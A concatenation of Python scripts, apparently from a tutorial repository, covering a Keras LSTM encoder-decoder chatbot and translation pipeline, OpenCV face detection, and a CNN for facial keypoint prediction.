    return text

# def generate_batch(X, y, num_decoder_tokens, max_length_src, max_length_target, batch_size=256):
#     """Generating data"""
#     while True:
#         for j in range(0, len(X), batch_size):
#             encoder_input_data = np.zeros((batch_size, max_length_src), dtype='float32')
#             decoder_input_data = np.zeros((batch_size, max_length_target), dtype='float32')
#             decoder_target_data = np.zeros((batch_size, max_length_target, num_decoder_tokens), dtype='float32')
#             for i, (input_text, target_text) in enumerate(zip(X[j: j+batch_size], y[j: j+batch_size])):
#                 for t, word in enumerate(input_text.split()):
#                     encoder_input_data[i, t] = input_word_index[word] # encoder input sequence
#                 for t, word in enumerate(target_text.split()):
#                     if t > 0:
#                         # offset by one timestep
#                         # one-hot encoded
#                         decoder_target_data[i, t-1, target_token_index[word]] = 1
#                     if t < len(target_text.split()) - 1:
#                         decoder_input_data[i, t] = target_token_index[word]
#             yield ([encoder_input_data, decoder_input_data], decoder_target_data)

# def tokenize(x, tokenizer=None):
#     """Tokenize x
#     :param x: List of sentences/strings to be tokenized
#     :return: Tuple of (tokenized x data, tokenizer used to tokenize x)"""
#     if tokenizer:
#         t = tokenizer
#     else:
#         t = Tokenizer()
#     t.fit_on_texts(x)
#     return t.texts_to_sequences(x), t


# def pad(x, length=None):
#     """Pad x
#     :param x: list of sequences
#     :param length: Length to pad the sequence to, If None, use length
#     of longest sequence in x.
#     :return: Padded numpy array of sequences"""
#     return pad_sequences(x, maxlen=length, padding="post")


# def preprocess(x, y):
#     """Preprocess x and y
#     :param x: Feature list of sentences
#     :param y: Label list of sentences
#     :return: Tuple of (preprocessed x, preprocessed y, x tokenizer, y tokenizer)"""
#     preprocess_x, x_tk = tokenize(x)
#     preprocess_y, y_tk = tokenize(y)
#     preprocess_x2 = [ [0] + s for s in preprocess_y ]
#     longest_x = max([len(i) for i in preprocess_x])
#     longest_y = max([len(i) for i in preprocess_y]) + 1
#     # max_length = len(x_tk.word_index) if len(x_tk.word_index) > len(y_tk.word_index) else len(y_tk.word_index)
#     max_length = longest_x if longest_x > longest_y else longest_y

#     preprocess_x = pad(preprocess_x, length=max_length)
#     preprocess_x2 = pad(preprocess_x2, length=max_length)
#     preprocess_y = pad(preprocess_y, length=max_length)

#     # preprocess_x = to_categorical(preprocess_x)
#     # preprocess_x2 = to_categorical(preprocess_x2)
#     preprocess_y = to_categorical(preprocess_y)

#     return preprocess_x, preprocess_x2, preprocess_y, x_tk, y_tk




from keras.layers import Embedding, TimeDistributed, Dense, GRU, LSTM, Input
from keras.models import Model, Sequential
from keras.utils import to_categorical

import numpy as np
import tqdm


def encoder_decoder_model(num_encoder_tokens, latent_dim, num_decoder_tokens, embedding_matrix=None, embedding_layer=True):
    # ENCODER
    # define an input sequence and process it
        
    if embedding_layer:
        encoder_inputs = Input(shape=(None,))
        if embedding_matrix is None:
            encoder_emb_layer = Embedding(num_encoder_tokens, latent_dim, mask_zero=True)
        else:
            encoder_emb_layer = Embedding(num_encoder_tokens,
                                            latent_dim,
                                            mask_zero=True,
                                            weights=[embedding_matrix],
                                            trainable=False)

        encoder_emb = encoder_emb_layer(encoder_inputs)
    else:
        encoder_inputs = Input(shape=(None, num_encoder_tokens))
        encoder_emb = encoder_inputs
    encoder_lstm = LSTM(latent_dim, return_state=True)
    encoder_outputs, state_h, state_c = encoder_lstm(encoder_emb)

    # we discard encoder_outputs and only keep the states
    encoder_states = [state_h, state_c]

    # DECODER
    # Set up the decoder, using encoder_states as initial state
    if embedding_layer:
        decoder_inputs = Input(shape=(None,))
    else:
        decoder_inputs = Input(shape=(None, num_encoder_tokens))
    # add an embedding layer
    # decoder_emb_layer = Embedding(num_decoder_tokens, latent_dim, mask_zero=True)
    if embedding_layer:
        decoder_emb = encoder_emb_layer(decoder_inputs)
    else:
        decoder_emb = decoder_inputs
    # we set up our decoder to return full output sequences
    # and to return internal states as well, we don't use the
    # return states in the training model, but we will use them in inference
    decoder_lstm = LSTM(latent_dim, return_sequences=True, return_state=True)
    decoder_outputs, _, _, = decoder_lstm(decoder_emb, initial_state=encoder_states)
    # dense output layer used to predict each character ( or word )
    # in one-hot manner, not recursively
    decoder_dense = Dense(num_decoder_tokens, activation="softmax")
    decoder_outputs = decoder_dense(decoder_outputs)
    # finally, the model is defined with inputs for the encoder and the decoder
    # and the output target sequence
    # turn encoder_input_data & decoder_input_data into decoder_target_data
    model = Model([encoder_inputs, decoder_inputs], output=decoder_outputs)
    # model.summary()
    # define encoder inference model
    encoder_model = Model(encoder_inputs, encoder_states)
    # define decoder inference model
    decoder_state_input_h = Input(shape=(latent_dim,))
    decoder_state_input_c = Input(shape=(latent_dim,))
    decoder_states_inputs = [decoder_state_input_h, decoder_state_input_c]

    # Get the embeddings of the decoder sequence
    if embedding_layer:
        dec_emb2 = encoder_emb_layer(decoder_inputs)
    else:
        dec_emb2 = decoder_inputs

    decoder_outputs, state_h, state_c = decoder_lstm(dec_emb2, initial_state=decoder_states_inputs)
    decoder_states = [state_h, state_c]
    decoder_outputs = decoder_dense(decoder_outputs)
    decoder_model = Model([decoder_inputs] + decoder_states_inputs, [decoder_outputs] + decoder_states)
    return model, encoder_model, decoder_model
    



def predict_sequence(enc, dec, source, n_steps, cardinality, char_level=False):
    """Generate target given source sequence, this function can be used
    after the model is trained to generate a target sequence given a source sequence."""
    # encode
    state = enc.predict(source)
    # start of sequence input
    if char_level:
        target_seq = np.zeros((1, 1, 61))
    else:
        target_seq = np.zeros((1, 1))
    # collect predictions
    output = []
    for t in range(n_steps):
        # predict next char
        yhat, h, c = dec.predict([target_seq] + state)
        # store predictions
        y = yhat[0, 0, :]
        if char_level:
            sampled_token_index = to_categorical(np.argmax(y), num_classes=61)
        else:
            sampled_token_index = np.argmax(y)
        output.append(sampled_token_index)
        # update state
        state = [h, c]
        # update target sequence
        if char_level:
            target_seq = np.zeros((1, 1, 61))
        else:
            target_seq = np.zeros((1, 1))
        target_seq[0, 0] = sampled_token_index
        
    return np.array(output)


def decode_sequence(enc, dec, input_seq):
    # Encode the input as state vectors.
    states_value = enc.predict(input_seq)
    
    # Generate empty target sequence of length 1.
    target_seq = np.zeros((1,1))
    
    # Populate the first character of target sequence with the start character.
    target_seq[0, 0] = 0
    
    # Sampling loop for a batch of sequences
    # (to simplify, here we assume a batch of size 1).
    stop_condition = False
    decoded_sequence = []
    
    while not stop_condition:
        output_tokens, h, c = dec.predict([target_seq] + states_value)
        # Sample a token
        sampled_token_index = np.argmax(output_tokens[0, -1, :])
        # sampled_char = reverse_target_char_index[sampled_token_index]
        decoded_sentence.append(output_tokens[0, -1, :])
        
        # Exit condition: either hit max length or find stop token.
        if (output_tokens == '<PAD>' or len(decoded_sentence) > 50):
            stop_condition = True
        
        # Update the target sequence (of length 1).
        target_seq = np.zeros((1,1))
        target_seq[0, 0] = sampled_token_index
        
        # Update states
        states_value = [h, c]
    
    return decoded_sentence




from keras.preprocessing.text import Tokenizer
from keras.preprocessing.sequence import pad_sequences
from keras.utils import to_categorical
import numpy as np


def tokenize(x, tokenizer=None):
    """Tokenize x
    :param x: List of sentences/strings to be tokenized
    :return: Tuple of (tokenized x data, tokenizer used to tokenize x)"""
    if tokenizer:
        t = tokenizer
    else:
        t = Tokenizer()
    t.fit_on_texts(x)
    return t.texts_to_sequences(x), t


def pad(x, length=None):
    """Pad x
    :param x: list of sequences
    :param length: Length to pad the sequence to, If None, use length
    of longest sequence in x.
    :return: Padded numpy array of sequences"""
    return pad_sequences(x, maxlen=length, padding="post")


def preprocess(x, y):
    """Preprocess x and y
    :param x: Feature list of sentences
    :param y: Label list of sentences
    :return: Tuple of (preprocessed x, preprocessed y, x tokenizer, y tokenizer)"""
    preprocess_x, x_tk = tokenize(x)
    preprocess_y, y_tk = tokenize(y)
    preprocess_x2 = [ [0] + s for s in preprocess_y ]
    longest_x = max([len(i) for i in preprocess_x])
    longest_y = max([len(i) for i in preprocess_y]) + 1
    # max_length = len(x_tk.word_index) if len(x_tk.word_index) > len(y_tk.word_index) else len(y_tk.word_index)
    max_length = longest_x if longest_x > longest_y else longest_y

    preprocess_x = pad(preprocess_x, length=max_length)
    preprocess_x2 = pad(preprocess_x2, length=max_length)
    preprocess_y = pad(preprocess_y, length=max_length)

    # preprocess_x = to_categorical(preprocess_x)
    # preprocess_x2 = to_categorical(preprocess_x2)
    preprocess_y = to_categorical(preprocess_y)

    return preprocess_x, preprocess_x2, preprocess_y, x_tk, y_tk


def load_data(filename):
    with open(filename) as f:
        text = f.read()
    return text.split("\n")


def load_dataset():
    english_sentences = load_data("data/small_vocab_en")
    french_sentences = load_data("data/small_vocab_fr")
    
    return preprocess(english_sentences, french_sentences)


# def generate_batch(X, y, num_decoder_tokens, max_length_src, max_length_target, batch_size=256):
#     """Generating data"""
#     while True:
#         for j in range(0, len(X), batch_size):
#             encoder_input_data = np.zeros((batch_size, max_length_src), dtype='float32')
#             decoder_input_data = np.zeros((batch_size, max_length_target), dtype='float32')
#             decoder_target_data = np.zeros((batch_size, max_length_target, num_decoder_tokens), dtype='float32')
#             for i, (input_text, target_text) in enumerate(zip(X[j: j+batch_size], y[j: j+batch_size])):
#                 for t, word in enumerate(input_text.split()):
#                     encoder_input_data[i, t] = input_word_index[word] # encoder input sequence
#                 for t, word in enumerate(target_text.split()):
#                     if t > 0:
#                         # offset by one timestep
#                         # one-hot encoded
#                         decoder_target_data[i, t-1, target_token_index[word]] = 1
#                     if t < len(target_text.split()) - 1:
#                         decoder_input_data[i, t] = target_token_index[word]
#             yield ([encoder_input_data, decoder_input_data], decoder_target_data)

if __name__ == "__main__":
    from generator import NMTGenerator
    gen = NMTGenerator(source_file="data/small_vocab_en", target_file="data/small_vocab_fr")
    gen.load_dataset()
    print(gen.num_decoder_tokens)
    print(gen.num_encoder_tokens)
    print(gen.source_sequence_length)
    print(gen.target_sequence_length)
    print(gen.X.shape)
    print(gen.y.shape)
    for i, ((encoder_input_data, decoder_input_data), decoder_target_data) in enumerate(gen.generate_batches()):
        # print("encoder_input_data.shape:", encoder_input_data.shape)
        # print("decoder_output_data.shape:", decoder_input_data.shape)
        if i % (len(gen.X) // gen.batch_size + 1) == 0:
            print(i, ": decoder_input_data:", decoder_input_data[0])




# to use CPU
import os
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,
                        inter_op_parallelism_threads=5, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )

from models import predict_sequence, encoder_decoder_model
from preprocess import tokenize, pad
from keras.utils import to_categorical
from generator import get_embedding_vectors
import pickle
import numpy as np

x_tk = pickle.load(open("results/x_tk.pickle", "rb"))
y_tk = pickle.load(open("results/y_tk.pickle", "rb"))



index_to_words = {id: word for word, id in y_tk.word_index.items()}
index_to_words[0] = '_'

def logits_to_text(logits):
    """
    Turn logits from a neural network into text using the tokenizer
    :param logits: Logits from a neural network
    :param tokenizer: Keras Tokenizer fit on the labels
    :return: String that represents the text of the logits
    """
    # return ' '.join([index_to_words[prediction] for prediction in np.argmax(logits, 1)])
    return ' '.join([index_to_words[prediction] for prediction in logits])


num_encoder_tokens = 29046
num_decoder_tokens = 29046
latent_dim = 300

# embedding_vectors = get_embedding_vectors(x_tk)

model, enc, dec = encoder_decoder_model(num_encoder_tokens, latent_dim, num_decoder_tokens)
enc.summary()
dec.summary()
model.summary()
model.load_weights("results/chatbot_v13_4.831_0.219.h5")

while True:
    text = input("> ")
    tokenized = tokenize([text], tokenizer=y_tk)[0]
    # print("tokenized:", tokenized)
    X = pad(tokenized, length=37)
    sequence = predict_sequence(enc, dec, X, 37, num_decoder_tokens)
    # print(sequence)
    result = logits_to_text(sequence)
    print(result)




# to use CPU
import os
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,
                        inter_op_parallelism_threads=5, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )

from models import predict_sequence, encoder_decoder_model
from preprocess import tokenize, pad
from keras.utils import to_categorical
from generator import get_embedding_vectors
import pickle
import numpy as np

x_tk = pickle.load(open("results/x_tk.pickle", "rb"))
y_tk = pickle.load(open("results/y_tk.pickle", "rb"))



index_to_words = {id: word for word, id in y_tk.word_index.items()}
index_to_words[0] = '_'

def logits_to_text(logits):
    """
    Turn logits from a neural network into text using the tokenizer
    :param logits: Logits from a neural network
    :param tokenizer: Keras Tokenizer fit on the labels
    :return: String that represents the text of the logits
    """
    # return ' '.join([index_to_words[prediction] for prediction in np.argmax(logits, 1)])
    # return ''.join([index_to_words[np.where(prediction==1)[0]] for prediction in logits])
    text = ""
    for prediction in logits:
        char_index = np.where(prediction)[0][0]

        char = index_to_words[char_index]
        text += char
    return text
        


num_encoder_tokens = 61
num_decoder_tokens = 61
latent_dim = 384

# embedding_vectors = get_embedding_vectors(x_tk)

model, enc, dec = encoder_decoder_model(num_encoder_tokens, latent_dim, num_decoder_tokens, embedding_layer=False)
enc.summary()
dec.summary()
model.summary()
model.load_weights("results/chatbot_charlevel_v2_0.32_0.90.h5")

while True:
    text = input("> ")
    tokenized = tokenize([text], tokenizer=y_tk)[0]
    # print("tokenized:", tokenized)
    X = to_categorical(pad(tokenized, length=37), num_classes=num_encoder_tokens)
    # print(X)
    sequence = predict_sequence(enc, dec, X, 206, num_decoder_tokens, char_level=True)
    # print(sequence)
    result = logits_to_text(sequence)
    print(result)




import numpy as np
import pickle
from models import encoder_decoder_model
from generator import NMTGenerator, get_embedding_vectors
from preprocess import load_dataset
from keras.callbacks import ModelCheckpoint
from keras_adabound import AdaBound

text_gen = NMTGenerator(source_file="data/questions",
                        target_file="data/answers",
                        batch_size=32,
                        same_tokenizer=True,
                        verbose=2)
text_gen.load_dataset()
print("[+] Dataset loaded.")

num_encoder_tokens = text_gen.num_encoder_tokens
num_decoder_tokens = text_gen.num_decoder_tokens
# get tokenizer
tokenizer = text_gen.x_tk
embedding_vectors = get_embedding_vectors(tokenizer)
print("text_gen.source_sequence_length:", text_gen.source_sequence_length)
print("text_gen.target_sequence_length:", text_gen.target_sequence_length)
num_tokens = max([num_encoder_tokens, num_decoder_tokens])
latent_dim = 300

model, enc, dec = encoder_decoder_model(num_tokens, latent_dim, num_tokens, embedding_matrix=embedding_vectors)
model.summary()
enc.summary()
dec.summary()
del enc
del dec
print("[+] Models created.")

model.compile(optimizer="rmsprop", loss="categorical_crossentropy", metrics=["accuracy"])
print("[+] Model compiled.")

# pickle.dump(x_tk, open("results/x_tk.pickle", "wb"))
print("[+] X tokenizer serialized.")

# pickle.dump(y_tk, open("results/y_tk.pickle", "wb"))
print("[+] y tokenizer serialized.")

# X = X.reshape((X.shape[0], X.shape[2], X.shape[1]))
# y = y.reshape((y.shape[0], y.shape[2], y.shape[1]))
print("[+] Dataset reshaped.")

# print("X1.shape:", X1.shape)
# print("X2.shape:", X2.shape)
# print("y.shape:", y.shape)
checkpointer = ModelCheckpoint("results/chatbot_v13_{val_loss:.3f}_{val_acc:.3f}.h5", save_best_only=False, verbose=1)
model.load_weights("results/chatbot_v13_4.806_0.219.h5")
# model.fit([X1, X2], y,
model.fit_generator(text_gen.next_train(),
                    validation_data=text_gen.next_validation(),
                    verbose=1,
                    steps_per_epoch=(len(text_gen.X_train) // text_gen.batch_size),
                    validation_steps=(len(text_gen.X_test) // text_gen.batch_size),
                    callbacks=[checkpointer],
                    epochs=5)
print("[+] Model trained.")

model.save_weights("results/chatbot_v13.h5")
print("[+] Model saved.")




import numpy as np
import pickle
from models import encoder_decoder_model
from generator import NMTGenerator, get_embedding_vectors
from preprocess import load_dataset
from keras.callbacks import ModelCheckpoint
from keras_adabound import AdaBound

text_gen = NMTGenerator(source_file="data/questions",
                        target_file="data/answers",
                        batch_size=256,
                        same_tokenizer=True,
                        char_level=True,
                        verbose=2)
text_gen.load_dataset()
print("[+] Dataset loaded.")

num_encoder_tokens = text_gen.num_encoder_tokens
num_decoder_tokens = text_gen.num_decoder_tokens
# get tokenizer
tokenizer = text_gen.x_tk
print("text_gen.source_sequence_length:", text_gen.source_sequence_length)
print("text_gen.target_sequence_length:", text_gen.target_sequence_length)
num_tokens = max([num_encoder_tokens, num_decoder_tokens])
latent_dim = 384

model, enc, dec = encoder_decoder_model(num_tokens, latent_dim, num_tokens, embedding_layer=False)
model.summary()
enc.summary()
dec.summary()
del enc
del dec
print("[+] Models created.")

model.compile(optimizer=AdaBound(lr=1e-3, final_lr=0.1), loss="categorical_crossentropy", metrics=["accuracy"])
print("[+] Model compiled.")

# pickle.dump(x_tk, open("results/x_tk.pickle", "wb"))
print("[+] X tokenizer serialized.")

# pickle.dump(y_tk, open("results/y_tk.pickle", "wb"))
print("[+] y tokenizer serialized.")

# X = X.reshape((X.shape[0], X.shape[2], X.shape[1]))
# y = y.reshape((y.shape[0], y.shape[2], y.shape[1]))
print("[+] Dataset reshaped.")

# print("X1.shape:", X1.shape)
# print("X2.shape:", X2.shape)
# print("y.shape:", y.shape)
checkpointer = ModelCheckpoint("results/chatbot_charlevel_v2_{val_loss:.2f}_{val_acc:.2f}.h5", save_best_only=False, verbose=1)
model.load_weights("results/chatbot_charlevel_v2_0.32_0.90.h5")
# model.fit([X1, X2], y,
model.fit_generator(text_gen.next_train(),
                    validation_data=text_gen.next_validation(),
                    verbose=1,
                    steps_per_epoch=(len(text_gen.X_train) // text_gen.batch_size)+1,
                    validation_steps=(len(text_gen.X_test) // text_gen.batch_size)+1,
                    callbacks=[checkpointer],
                    epochs=50)
print("[+] Model trained.")

model.save_weights("results/chatbot_charlevel_v2.h5")
print("[+] Model saved.")




import tqdm

X, y = [], []
with open("data/fr-en", encoding='utf8') as f:
    for i, line in tqdm.tqdm(enumerate(f), "Reading file"):
        if "europarl-v7" in line:
            continue
        # X.append(line)
        # if i == 2007723 or i == 2007724 or i == 2007725
        if i <= 2007722:
            X.append(line.strip())
        else:
            y.append(line.strip())

y.pop(-1)


with open("data/en", "w", encoding='utf8') as f:
    for i in tqdm.tqdm(X, "Writing english"):
        print(i, file=f)

with open("data/fr", "w", encoding='utf8') as f:
    for i in tqdm.tqdm(y, "Writing french"):
        print(i, file=f)




import glob
import tqdm
import os
import random
import inflect

p = inflect.engine()

X, y = [], []

special_words = {
    "haha", "rockikz", "fullclip", "xanthoss", "aw", "wow", "ah", "oh", "god", "quran", "allah",
    "muslims", "muslim", "islam", "?", ".", ",",
    '_func_val_get_callme_para1_comma0', '_num2_', '_func_val_get_last_question', '_num1_',
    '_func_val_get_number_plus_para1__num1__para2__num2_',
    '_func_val_update_call_me_enforced_para1__callme_',
    '_func_val_get_number_minus_para1__num2__para2__num1_', '_func_val_get_weekday_para1_d0',
    '_func_val_update_user_name_para1__name_', '_callme_', '_func_val_execute_pending_action_and_reply_para1_no',
    '_func_val_clear_user_name_and_call_me', '_func_val_get_story_name_para1_the_velveteen_rabbit', '_ignored_',
    '_func_val_get_number_divide_para1__num1__para2__num2_', '_func_val_get_joke_anyQ:',
    '_func_val_update_user_name_and_call_me_para1__name__para2__callme_', '_func_val_get_number_divide_para1__num2__para2__num1_Q:',
    '_name_', '_func_val_ask_name_if_not_yet', '_func_val_get_last_answer', '_func_val_continue_last_topic',
    '_func_val_get_weekday_para1_d1', '_func_val_get_number_minus_para1__num1__para2__num2_', '_func_val_get_joke_any',
    '_func_val_get_story_name_para1_the_three_little_pigs', '_func_val_update_call_me_para1__callme_',
    '_func_val_get_story_name_para1_snow_white', '_func_val_get_today', '_func_val_get_number_multiply_para1__num1__para2__num2_',
    '_func_val_update_user_name_enforced_para1__name_', '_func_val_get_weekday_para1_d_2', '_func_val_correct_user_name_para1__name_',
    '_func_val_get_time', '_func_val_get_number_divide_para1__num2__para2__num1_', '_func_val_get_story_any',
    '_func_val_execute_pending_action_and_reply_para1_yes', '_func_val_get_weekday_para1_d_1', '_func_val_get_weekday_para1_d2'
}

english_words = { word.strip() for word in open("data/words8.txt") }

embedding_words = set()
f = open("data/glove.6B.300d.txt", encoding='utf8')
for line in tqdm.tqdm(f, "Reading GloVe words"):
    values = line.split()
    word = values[0]
    embedding_words.add(word)

maps = open("data/maps.txt").readlines()
word_mapper = {}
for map in maps:
    key, value = map.split("=>")
    key = key.strip()
    value = value.strip()
    print(f"Mapping {key} to {value}")
    word_mapper[key.lower()] = value


unks = 0
digits = 0
mapped = 0
english = 0
special = 0

def map_text(line):
    global unks
    global digits
    global mapped
    global english
    global special
    result = []
    append = result.append
    words = line.split()
    for word in words:
        word = word.lower()
        if word.isdigit():
            append(p.number_to_words(word))
            digits += 1
            continue
        if word in word_mapper:
            append(word_mapper[word])
            mapped += 1
            continue
        if word in english_words:
            append(word)
            english += 1
            continue
        if word in special_words:
            append(word)
            special += 1
            continue
        append("_unk_")
        unks += 1
    return ' '.join(result)

for file in tqdm.tqdm(glob.glob("data/Augment*/*"), "Reading files"):
    with open(file, encoding='utf8') as f:
        for line in f:
            line = line.strip()
            if "Q: " in line:
                X.append(line)
            elif "A: " in line:
                y.append(line)

# shuffle X and y maintaining the order
combined = list(zip(X, y))
random.shuffle(combined)

X[:], y[:] = zip(*combined)

with open("data/questions", "w") as f:
    for line in tqdm.tqdm(X, "Writing questions"):
        line = line.strip().lstrip('Q: ')
        line = map_text(line)
        print(line, file=f)

print()

print("[!] Unks:", unks)
print("[!] digits:", digits)
print("[!] Mapped:", mapped)
print("[!] english:", english)
print("[!] special:", special)
print()

unks = 0
digits = 0
mapped = 0
english = 0
special = 0

with open("data/answers", "w") as f:
    for line in tqdm.tqdm(y, "Writing answers"):
        line = line.strip().lstrip('A: ')
        line = map_text(line)
        print(line, file=f)

print()
print("[!] Unks:", unks)
print("[!] digits:", digits)
print("[!] Mapped:", mapped)
print("[!] english:", english)
print("[!] special:", special)
print()




import numpy as np
import cv2


# loading the test image
image = cv2.imread("kids.jpg")

# converting to grayscale
image_gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)

# initialize the face recognizer (default face haar cascade)
face_cascade = cv2.CascadeClassifier("cascades/haarcascade_fontalface_default.xml")

# detect all the faces in the image
faces = face_cascade.detectMultiScale(image_gray, 1.3, 5)

# for every face, draw a blue rectangle
for x, y, width, height in faces:
    cv2.rectangle(image, (x, y), (x + width, y + height), color=(255, 0, 0), thickness=2)

# save the image with rectangles
cv2.imwrite("kids_detected.jpg", image)




import numpy as np
import cv2

# create a new cam object
cap = cv2.VideoCapture(0)

# initialize the face recognizer (default face haar cascade)
face_cascade = cv2.CascadeClassifier("cascades/haarcascade_fontalface_default.xml")

while True:
    # read the image from the cam
    _, image = cap.read()
    # converting to grayscale
    image_gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)

    # detect all the faces in the image
    faces = face_cascade.detectMultiScale(image_gray, 1.3, 5)

    # for every face, draw a blue rectangle
    for x, y, width, height in faces:
        cv2.rectangle(image, (x, y), (x + width, y + height), color=(255, 0, 0), thickness=2)

    cv2.imshow("image", image)

    if cv2.waitKey(1) == ord("q"):
        break

cap.release()
cv2.destroyAllWindows()




import cv2
import numpy as np
import matplotlib.pyplot as plt

import sys

from models import create_model
from parameters import *
from utils import normalize_image


def untransform(keypoints):
    return keypoints * 50 + 100


def get_single_prediction(model, image):
    image = np.expand_dims(image, axis=0)
    keypoints = model.predict(image)[0]
    return keypoints.reshape(*OUTPUT_SHAPE)


def show_keypoints(image, predicted_keypoints, true_keypoints=None):
    predicted_keypoints = untransform(predicted_keypoints)        
    plt.imshow(np.squeeze(image), cmap="gray")
    plt.scatter(predicted_keypoints[:, 0], predicted_keypoints[:, 1], s=20, marker=".", c="m")
    if true_keypoints is not None:
        true_keypoints = untransform(true_keypoints)
        plt.scatter(true_keypoints[:, 0], true_keypoints[:, 1], s=20, marker=".", c="g")
    plt.show()


image = cv2.imread(sys.argv[1])
image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)

# # construct the model
model = create_model((*IMAGE_SIZE, 1), OUTPUT_SHAPE[0] * OUTPUT_SHAPE[1])

model.load_weights("results/model_smoothl1.h5")

face_cascade = cv2.CascadeClassifier("haarcascade_frontalface_default.xml")
# get all the faces in the image
faces = face_cascade.detectMultiScale(image, 1.2, 2)

for (x, y, w, h) in faces:
    cv2.rectangle(image, (x, y), (x+w, y+h), (255, 0, 0), 3)
    face_image = image.copy()[y: y+h, x: x+w]
    face_image = normalize_image(face_image)
    keypoints = get_single_prediction(model, face_image)
    show_keypoints(face_image, keypoints)




import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import cv2

from models import create_model
from parameters import IMAGE_SIZE, BATCH_SIZE, EPOCHS, OUTPUT_SHAPE, training_file, testing_file
from utils import load_data, resize_image, normalize_keypoints, normalize_image


def get_single_prediction(model, image):
    image = np.expand_dims(image, axis=0)
    keypoints = model.predict(image)[0]
    return keypoints.reshape(*OUTPUT_SHAPE)

def get_predictions(model, X):
    predicted_keypoints = model.predict(X)
    predicted_keypoints = predicted_keypoints.reshape(-1, *OUTPUT_SHAPE)
    return predicted_keypoints
    

def show_keypoints(image, predicted_keypoints, true_keypoints=None):
    predicted_keypoints = untransform(predicted_keypoints)        
    plt.imshow(image, cmap="gray")
    plt.scatter(predicted_keypoints[:, 0], predicted_keypoints[:, 1], s=20, marker=".", c="m")
    if true_keypoints is not None:
        true_keypoints = untransform(true_keypoints)
        plt.scatter(true_keypoints[:, 0], true_keypoints[:, 1], s=20, marker=".", c="g")
    plt.show()


def show_keypoints_cv2(image, predicted_keypoints, true_keypoints=None):
    for keypoint in predicted_keypoints:
        image = cv2.circle(image, (keypoint[0], keypoint[1]), 2, color=2)
    if true_keypoints is not None:
        image = cv2.circle(image, (true_keypoints[:, 0], true_keypoints[:, 1]), 2, color="green")
    return image


def untransform(keypoints):
    return keypoints * 224


# construct the model
model = create_model((*IMAGE_SIZE, 1), OUTPUT_SHAPE[0] * OUTPUT_SHAPE[1])

model.load_weights("results/model_smoothl1_different-scaling.h5")

# X_test, y_test = load_data(testing_file)
# y_test = y_test.reshape(-1, *OUTPUT_SHAPE)

cap = cv2.VideoCapture(0)

while True:
    _, frame = cap.read()
    # make a copy of the original image
    image = frame.copy()
    image = normalize_image(image)

    keypoints = get_single_prediction(model, image)
    print(keypoints[0])
    keypoints = untransform(keypoints)
    # w, h = frame.shape[:2]
    # keypoints = (keypoints * [frame.shape[0] / image.shape[0], frame.shape[1] / image.shape[1]]).astype("int16")
    # frame = show_keypoints_cv2(frame, keypoints)
    image = show_keypoints_cv2(image, keypoints)
    cv2.imshow("frame", image)

    if cv2.waitKey(1) == ord("q"):
        break

cv2.destroyAllWindows()
cap.release()




from tensorflow.keras.models import Sequential, Model
from tensorflow.keras.layers import Dense, Activation, Conv2D, MaxPooling2D, Dropout, Flatten
from tensorflow.keras.applications import MobileNetV2
import tensorflow as tf
import tensorflow.keras.backend as K

def smoothL1(y_true, y_pred):
    HUBER_DELTA = 0.5
    x   = K.abs(y_true - y_pred)
    x   = K.switch(x < HUBER_DELTA, 0.5 * x ** 2, HUBER_DELTA * (x - 0.5 * HUBER_DELTA))
    return K.sum(x)


def create_model(input_shape, output_shape):

    # building the model
    model = Sequential()

    model.add(Conv2D(filters=32, kernel_size=(5, 5), padding="same", input_shape=input_shape))
    model.add(Activation("relu"))
    model.add(Conv2D(filters=32, kernel_size=(5, 5), padding="same"))
    model.add(Activation("relu"))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    # model.add(Dropout(0.25))

    model.add(Conv2D(filters=64, kernel_size=(5, 5), padding="same"))
    model.add(Activation("relu"))
    model.add(Conv2D(filters=64, kernel_size=(5, 5), padding="same"))
    model.add(Activation("relu"))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    # model.add(Dropout(0.25))

    model.add(Conv2D(filters=128, kernel_size=(5, 5), padding="same"))
    model.add(Activation("relu"))
    model.add(Conv2D(filters=128, kernel_size=(5, 5), padding="same"))
    model.add(Activation("relu"))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    # model.add(Dropout(0.25))

    # model.add(Conv2D(filters=256, kernel_size=(5, 5), padding="same"))
    # model.add(Activation("relu"))
    # model.add(Conv2D(filters=256, kernel_size=(5, 5), padding="same"))
    # model.add(Activation("relu"))
    # model.add(MaxPooling2D(pool_size=(2, 2)))
    # # model.add(Dropout(0.25))

    # flattening the convolutions
    model.add(Flatten())
    # fully-connected layers
    model.add(Dense(256))
    model.add(Activation("relu"))
    model.add(Dropout(0.5))
    model.add(Dense(output_shape, activation="linear"))

    # print the summary of the model architecture
    model.summary()

    # training the model using rmsprop optimizer
    # model.compile(loss="mean_squared_error", optimizer="adam", metrics=["mean_absolute_error"])
    model.compile(loss=smoothL1, optimizer="adam", metrics=["mean_absolute_error"])
    return model


def create_mobilenet_model(input_shape, output_shape):
    model = MobileNetV2(input_shape=input_shape)
    # remove the last layer
    model.layers.pop()
    # freeze all the weights of the model except for the last 4 layers
    for layer in model.layers[:-4]:
        layer.trainable = False
    # construct our output dense layer
    output = Dense(output_shape, activation="linear")
    # connect it to the model
    output = output(model.layers[-1].output)

    model = Model(inputs=model.inputs, outputs=output)

    model.summary()

    # training the model using adam optimizer
    # model.compile(loss="mean_squared_error", optimizer="adam", metrics=["mean_absolute_error"])
    model.compile(loss=smoothL1, optimizer="adam", metrics=["mean_absolute_error"])
    return model




IMAGE_SIZE = (224, 224)
OUTPUT_SHAPE = (68, 2)
BATCH_SIZE = 20
EPOCHS = 30

training_file = "data/training_frames_keypoints.csv"
testing_file = "data/test_frames_keypoints.csv"




import pandas as pd
import numpy as np
